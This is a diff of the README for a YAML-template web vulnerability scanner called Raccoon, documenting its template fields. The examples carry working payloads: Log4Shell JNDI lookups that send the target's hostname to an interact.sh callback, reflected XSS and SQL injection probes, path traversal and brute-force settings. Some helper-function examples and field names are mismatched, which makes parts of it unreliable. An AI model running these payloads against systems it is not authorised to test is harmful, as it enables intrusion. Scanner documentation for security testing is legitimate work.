@@ -30,7 +30,7 @@
 ```
                                                     
 ## I. **Introduction**
-Racoon is based on the perception of using YAML template file as the input for sent, receive and process data from request. One of the main strength of our tool is customizable template. A knowledge user can create their own template suitable with their need. Those template are written by YAML because this language has a simple and clean syntax and very human-readable.
+Raccoon is based on the perception of using YAML template file as the input for sent request, receive and process data from response. One of the main strength of our tool is customizable template. A knowledge user can create their own template suitable with their need. Those template are written by YAML because this language has a simple and clean syntax and very human-readable.
 
 <p id="components"> </p>
 
@@ -41,27 +41,32 @@ Racoon is based on the perception of using YAML template file as the input for s
 >### 1. **Info block**
    
 Info block provides some basic data fields like: id, name, author, severity, description, remediation, tags,... Info block is dynamic fields, user can add their own fields to provide more information about current template. 
-Each template has a unique ID for identifier. ID must not contain spaces and another special character.
+Each template has a unique ID for identifier. ID must not contain spaces and another special character. In addition, templates are also classified by many other attributes, user can classify their templates by using **classification** field. In the example below, template CVE-2021-44228 is classified by four attributes are specified under  **classification**. 
+Another important field is **recommendation**, users can suggest a few important suggestions to improve security and limit vulnerabilities for those web applications.
 
 Example:
 
 ```
 info:
-  name: Satellian Intellian Aptus Web <= 1.24 RCE
-  author: ritikchaddha
+  id: CVE-2021-44228
+  name: Apache Log4j2 Remote Code Injection
+  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
   severity: critical
-  description: 'Intellian Aptus Web 1.24 allows remote attackers to execute arbitrary OS commands via the Q field within JSON data to the cgi-bin/libagent.cgi URI. NOTE: a valid sid cookie for a login to the intellian
-    default account might be needed.'
+  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  recommendation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
   reference:
-    - https://nvd.nist.gov/vuln/detail/CVE-2020-7980
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+  tags: cve,cve2021,rce,oast,log4j,injection
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-    cvss-score: 9.8
-    cve-id: CVE-2020-7980
-    cwe-id: CWE-78
-  metadata:
-    shodan-query: http.title:"Intellian Aptus Web"
-  tags: satellian,rce,cve,cve2020,intellian,aptus
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.00
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+
 ```
 <a href="#menu"> Back to main menu </a>
 
@@ -69,48 +74,143 @@ info:
 
 > ### 2. **Request block**
 >> **a. Raw request**:
-Multiple requests can be made from only one single template. Requests block specifies the start of the requests for the template.
+Raw request is the original request that will be sent to retrieve data from web server. Multiple requests can be made from only one single template. Requests block specifies the start of the requests for the template.
+
 
 ```
 requests:
 ```
+
+**Example of raw request**:
+
+```
+GET /success.txt?ipv6 HTTP/1.1
+Host: detectportal.firefox.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+```
+
 
 #### **Method**
 <h1 id="test"></h1>
-Those request method can be GET, POST, PUT, DELETE,...
+Those request method can be GET, POST, PUT, DELETE.
 
 ```
 requests:
-  - request: #Method is specific in front of each request
+  - request:
       - |
-        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
+        POST /wp-login.php HTTP/1.1
         Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      - |
+        GET /wp-admin/admin.php?page=my-sticky-elements-leads&search-contact=xxxx%22%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29+x HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<img src onerror=alert(`document.domain`) x">'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
 ```
 
 **Redirect**
 
 ---
 
-This field decides whether current requests can be redirect or not. By default, redirects are not allowed(it brings false value). However, if user want to redirect, it can be turn on with **redirects: true**.
+This field decides whether current requests can be redirect or not. By default, redirects are not allowed(it brings false value). However, if user want to redirect, it can be turn on with **redirect: true**.
 
+**Example:**
 ```
 requests:
-  - request:
+  - raw:
       - |
-        POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1
+        GET /?q={{url_encode("{{userid}}")}}%2Fcancel HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{form_build_id}} HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
+        form_build_id={{form_build_id}}
 
-        appno= 1 union SELECT 98989*443131,1&editor=cn&site=web
-
-    redirects: true
+    cookie-reuse: true
+    redirect: true         #Using redirect
+    matchers:
+      - type: word
+        words:
+          - 'CVE-2018-7602-POC'
 ```
 
 **Path**
 
 ---
-Multiple path can be placed in single request.
-Those variables start with *{{* and end with *}}*, case-sensitive and are used in case you want to change the urls entered from the user.
+When the user enters one or more paths, they are separated into their own components, replaced with the variables in **raw request** field to form a complete request and send it to the web server.
+
+**Example of using Path:**
+
+>**Request in template**
+```
+requests:
+  - request:
+    - |
+      GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
+      Host: {{Hostname}}
+```
+
+>**URL is provided by user**:
+
+```
+https://103.90.225.135:8000
+```
+
+>**Request will be sent**
+
+```
+GET /?x=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.uri.jrdtt2i7gbs7wp2h0oxs0efwqcqr0d3gn.interact.sh%2Fa%7D HTTP/1.1
+Host: 103.90.225.135:8000
+User-Agent: python-requests/2.27.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+```
+
+Those variables start with *{{* and end with *}}*, case-sensitive.
+
+**Example of raw request is declared in the template**:
+
+```
+requests:
+  - request:
+      - |
+        GET /dvwa?username={{users}}&passwd={{passwords}}&email={{emails}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: {{users}}{{passwords}}&email={{emails}}
+
+        username={{users}}{{Port}}&passwd={{passwords}}&email={{emails}}
+```
+
+**Path Variables:**
 
 ```
 Sample URL: https://testpage.com:8081/login/login.php
@@ -136,117 +236,94 @@ Sample URL: https://testpage.com:8081/login/login.php
 
 ---
 
-**cookie-reuse:true** 
-By default cookie will be expired after request is finished. To maintain cookie between series of request user can use this field below.
+By default, cookies will not be persisted in the same session, each request will generate a different cookie. To allow cookies to be remained within the same session user can use this field below.
+
+**cookie: true** 
+
 ```
-cookie-reuse: true
+requests:
+  - request:
+    - |
+      POST /wp-login.php HTTP/1.1
+      Host: {{Hostname}}
+      Origin: {{RootURL}}
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+      log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+    - |
+      GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo<script>alert(document.domain)</script> HTTP/1.1
+      Host: {{Hostname}}
+
+    cookie: true
+    matchersCondition: and
 ```
-**Request Condition**
+
+**Thread:**
+User can specify the number of requests to be sent simultaneously using
+
+*thread: \<number>*
+
+```
+thread: 10            # 10 request will be sent simultaneously
+scanMode: pitchfork
+stopAtFirstMatch: false
+matchers:
+  - type: word
+    part: interactsh_protocol  # Confirms the DNS Interaction
+    word:
+      - "dns"
+```
+
+**Muiltiple Requests Condition**
 
 ---
 
-Request condition is used when user want to check for complex condition between multiple requests. 
-The matcher can be initialized by adding *req-condition: true* and **HTTP respons code** are specific in the *dsl* field with respective attributes: **status_code_1, status_code_2, status_code_3, [other condition], etc.**
-Look at an example below to understand more about declarations
+Muiltiple Requests Condition is used when user want to check for complex condition between multiple requests. 
+The matcher can be initialized by adding *multipleRequests: true*.
+Look at an example below to understand more about the declarations.
 
 ```
-req-condition: true
-    cookie-reuse: true
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_1 == 302 && status_code_2 == 200 && status_code_3 == 200'
-          - 'contains(body_2, "[zm_gallery id=")'
-        condition: and
-```
-
-```
-info:
-  id: CVE-2021-44228
-  name: Apache Log4j2 Remote Code Injection
-  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
-  severity: critical
-  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
-  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
-  reference:
-    - https://logging.apache.org/log4j/2.x/security.html
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
-    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
-    - https://www.lunasec.io/docs/blog/log4j-zero-day/
-    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
-  tags: cve,cve2021,rce,oast,log4j,injection
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.00
-    cve-id: CVE-2021-44228
-    cwe-id: CWE-502
-
 requests:
   - request:
       - |
-        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
+        PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
         Host: {{Hostname}}
+
+        <!DOCTYPE html><script>alert(document.domain)</script>
+
       - |
-        POST / HTTP/1.1
+        GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1
         Host: {{Hostname}}
-        Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
-        Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
-        Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
-        Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
-        Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
-        Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
-        Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
-        Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
-        Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
-        Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
-        Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
-        Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
-        User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
-        X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
-        X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
-        X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
-        X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
-        X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
-        Content-Type: application/json
-    stop-at-first-match: true
+
+    requestCondition: true
     matchers-condition: and
     matchers:
+      - type: status
+        status:
+          - 200
+
       - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
+        part: header
         words:
-          - "dns"
+          - "text/html"
 
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip # Print remote interaction IP in output
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+      - type: word
+        part: body_2
+        words:
+          - "<!DOCTYPE html><script>alert(document.domain)</script>"
 ```
+
 <a href="#menu"> Back to main menu </a>
 
 <p id="fuzzing"></p>
 
 >> **b. Fuzzing**:
 ---
-Racoon supports running various type of payloads in multiple format. User can perform batteringram, pitchfork and clusterbomb attacks depends on their need. Those wordlists for these attacks needs to be defined during the request definition under the Payload field.
+Racoon supports running various type of payloads in multiple format. User can perform batteringram, pitchfork and clusterbomb attacks depends on their need. Those wordlists for these attacks needs to be defined during the request definition under the payloads field. 
 
-Attack mode:
+Scan mode:
 - batteringram:
   This uses a single set of payload, iterates through it and places the same payload value in all positions.
 - pitchfork:
@@ -255,13 +332,17 @@ Attack mode:
   This use multiple payload set The clusterbomb attack tries all different combinations of payload like **pitchfork**. But when it loops through the payload sets, it tries all combinations.
   ==> This attack type is useful for brute-force attack..
 
+User can declare value for each payload parameter directly or through files. 
+
 ```
 payloads:
-      username:
-        - admin
-      password:
-        - axis2
-    attack: pitchfork
+  username:
+    - admin
+  password:
+    - axis2           #declare directly
+  email:
+    - "C:\Users\Admin\Desktop\emails-list.txt"          #declare through file
+  scanMode: pitchfork
 ```
 
 >> **c. Operator**
@@ -272,111 +353,169 @@ payloads:
 
 ---
 
-This field contains different type of comparisons to support analysis responses in any case. Basically, there are 5 type of matchers: status, word, regex, dsl, time.
+This field contains different type of comparisons to support analysis responses in any case. Basically, there are 5 type of matchers: status, word, regex, helper, time.
 
 In real case, Word and Regex matchers can be configured later depend on user's needs.
+*helper* matcher can be used in combination of many complex expressions with helper functions to perform matching process.
 
-*dsl* matcher can be used in combination of many complex expressions with helper functions to perform matching process.
+*time* for response time.
 
 ```
 matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_2 == 200'
-          - 'contains(body_1, "htmoffice operate")'
-          - 'contains(body_2, "Windows IP")'
-        condition: and
+  - type: helper
+    helper:
+      - 'status_code_2 == 200'
+      - 'contains(body_1, "htmoffice operate")'
+      - 'contains(body_2, "Windows IP")'
+    condition: and
 ```
 
-**condition:** By default, it has value OR. User can decide it's value later.
 
-### Matcher condition:
+**condition:** By default, it has value OR. User can decide it's value later. This option allows multiple value of each matcher's type can be declared in a single matcher. In the example above, *condition* has a value and, that mean three helper functions in this matcher must be satisfied.
 
----
+**exclusion matcher** This field is used when user want to find a match with an exclusions. By default, it has value *false*. In the example below, when **exclusion** condition is declared with value *true*, it will return all the results that not having **application/json** in the response header.
 
-This field is used when user want to combine results from machers of all requests (in case using multiple requests)
+```
+matchers:
+  - type: word
+    part: header
+    words:
+      - "application/json"
+    exclusion: true
+```
+
+**Multiple Matchers**
+
+**Stop when meeting the first match**
+
+In the case of using multiple requests or matchers, this field is used to stop the program from sending requests if any matcher is satisfied. It is disabled by default.
+
+Syntax: *FirstMatchStop: true*
 
 ```
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'
+  - request:
+      - |
+        GET /wp-admin/admin-ajax.php?action={{md5(replace('http://HOST/-redux','HOST',Hostname))}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
 
-    redirects: true
-    max-redirects: 2
+      - |
+        GET /wp-admin/admin-ajax.php?action={{md5(replace('https://HOST/-redux','HOST',Hostname))}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
-      - type: word
+      - type: dsl
+        dsl:
+          - "len(body)<50"
+
+      - type: regex
+        name: meme
+        regex:
+          - '[a-f0-9]{32}'
         part: body
-        words:
-          - "<?php"
-          - "login_met_cookie($metinfo_admin_name);"
-        condition: and
+
+      - type: status
+        status:
+          - 200
+```
+
+**Multiple Matcher condition:**
+
+---
+
+When multiple matchers are used, the condition by default is OR. User can change the value to AND in case of they want the result will be return if all matchers are satisfied.
+*multipleMatcher: and*
+
+```
+multipleMatcher: and
+matchers:
+  - type: status
+    status:
+      - 200
+
+  - type: word
+    part: body
+    words:
+      - '"name":"admin"'
+      - '"admin":true'
+    condition: and
 
 ```
 <a href="#menu"> Back to main menu </a>
 
+
+
 ### **Exposer**:
 
 ---
+Exposer can be used to extract and display results from the match of the response handler.
 
-Extractors can be used to extract and display results from the match of the response handler.
-
-Our tool support two type of extractors:
+Our tool support four type of exposers:
 - regex - extract data from response based on a Regular Expression
-- kval - extract key: value/key=value formatted data from Response Header/Cookie.
-- json - extract data from JSON based response in JQ like syntax.
+- kval 	- extract key: value/key=value formatted data from Response Header/Cookie.
 - xpath - extract xpath based data from HTML Response
-Example extractor for HTTP Response body using regex.
+Example exposer for HTTP Response body using regex.
 
 ```
-Example REGEX
+exposer:
+  - type: regex
+    part: body
+    group: 1
+    regex:
+      - '"version": "([0-9.]+)"'
 ```
 
 kval example to extract content-type header from HTTP Response.
 
 ```
-Example KVAL
+exposer:
+  - type: kval
+    part: header
+    kval:
+      - server
 ```
 
-In real case, content-type will be replaced with content_type because kval extractor does not accept dash (-) as input.
+In real case, content-type will be replaced with content_type because kval exposer does not accept dash (-) as input.
 
 
-A json example to extract value of **name**, **author**, etc.
-
-```
-Example JSON
-```
-
-
-A xpath extractor example to extract value from HTML response.
+A xpath exposer can be used to extract value from HTML response. User can specify where to extract data with attribute field. In this example below, user want to extract value of *value* attribute from response, so that the syntax will be **attribute: value**.
 
 ```
-example of xpath
+exposer:
+  - type: xpath
+    name: VS
+    interior: true
+    attribute: value
+    xpath:
+      - "/html/body/form/div/input[@id='__VIEWSTATE']"
 ```
 
-**Dynamic extractor**
+**Dynamic Exposer**
 
 ---
 
-Another type of extractor is Dynamic extractor. It can be used to capture values after performing the analysis response. 
+Another type of exposer is Dynamic exposer. It can be used to capture values after performing the analysis response. If user want to use that exposer as a dynamic variable *interior: true* come into play (by default, it has the value false). This field is also used to prevent the values from being printed to the screen.
 
 ```
-extractors:
-      - type: regex
-        name: windows_working_path
-        internal: true
-        group: 1
-        regex:
-          - ".?.?\\\\.*\\\\showenv"
+exposer:
+  - type: regex
+    name: windows_working_path
+    interior: true
+    group: 1
+    regex:
+      - ".?.?\\\\.*\\\\showenv"
 ```
-In this example above, the value matched the regex field is going to be stored in the variable named *windows_working_path* and if user want to use that variable later in another case, *internal: true* must be placed in extractors field.
-Another optional variable *group* can be use to grab Extracted Value more accurately.
+In this example above, the value matched the regex field is going to be stored in the variable named *windows_working_path* and if user want to use that variable later, *interior: true* must be placed in exposers field.
+In case of multiple result of matcher are returned, an optional variable *group* can be use to grab those value more accurately as same as getting the value of an element from the array.
 
 ```
-group: 0 (full match - by default are not specified)
-group: 1 (first match)
-group: 2 (second match)
+group: 0 for full match (by default are not specified)
+group: 1 for first match 
+group: 2 for second match
 ...
 And so on.
 ```
@@ -406,9 +545,9 @@ Each request is provided each unique interact.sh URLs.
 
 ---
 
-Interactsh interactions can be used with word, regex or dsl matcher/extractor
+Interactsh interactions can be used with word, regex or helper matcher/exposer
 
-> interactsh_protocol: dns, http, smtp. 
+> interactsh_protocol: dns, http or smtp. 
 ```
 matchers:
   - type: word
@@ -428,38 +567,6 @@ exposer:
 ```
 >interactsh_response: the response that the interact.sh server sent to the client
 
-
-**Preprocessors**
-
----
-
-Pre-processors can be specified globally in the template to generate a **random ids** for each template run.
-
-> **randstr**: random ID. This will always contain the same value can be used anywhere in the template. 
-
-randstr can be used within matchers to match the inputs from user.
-
-```
-requests:
-  - request:
-      - |
-        PUT /fileserver/test.txt HTTP/1.1
-        Host: {{Hostname}}
-
-        {{randstr}}
-      - |
-        GET /fileserver/test.txt HTTP/1.1
-        Host: {{Hostname}}
-
-    req-condition: true
-    matchers:
-      - type: dsl
-        dsl:
-          - "status_code_1==204"
-          - "status_code_2==200"
-          - "contains((body_2), '{{randstr}}')"
-        condition: and
-```
 <a href="#menu"> Back to main menu </a>
 
 <p id="helper"> </p>
@@ -486,13 +593,11 @@ requests:
 |to_lower(string) [string]| Transforms the given string into lowercase characters |to_lower("HELLO") ==> hello|
 |to_lower("HELLO") [string]| Transforms the given string into uppercase characters| to_upper("hello") // HELLO|
 |trim(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string| trim("xyTestxyxy", "xy") ==> "Test"|
-|trim_left(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string all about the left| trim_left("xyTestxyxy", "xy") ==> "Testxy"|
-|trim_prefix(given_string, cut_string) [string, string] | Returns given_string without the supplied trim_prefix string | trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
-|trim_right(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string in the front| trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
 |trim_space(given_string) [string, string] | Remove all the space in the given_string| trim_space("Hello   world     ") ==> "Hello world"|
+|trim_left(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string all about the left| trim_left("xyTestxyxy", "xy") ==> "Testxy"|
+|trim_right(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string in the front| trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
 |trim_suffix(input, suffix string) [string, string] | Returns given_string without the supplied suffix string | trim_suffix("xxxxTestxx", "xx") ==> "xxxxTest"|
+|trim_prefix(given_string, cut_string) [string, string] | Returns given_string without the supplied trim_prefix string | trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
 |url_decode(given_string) [string] | URL decodes the given_string| url_decode("https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dpentest") ==> "https://www.google.com/search?q=pentest" |
 |url_encode(input string) [string] | URL encodes the given_string| url_encode("https://www.google.com/search?q=pentest") ==> "https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dpentest" |
-|wait_for(given_seconds) [int] | Wait for given_seconds to continue| wait_for(10) ==> true|
-
 <a href="#menu"> Back to main menu </a>
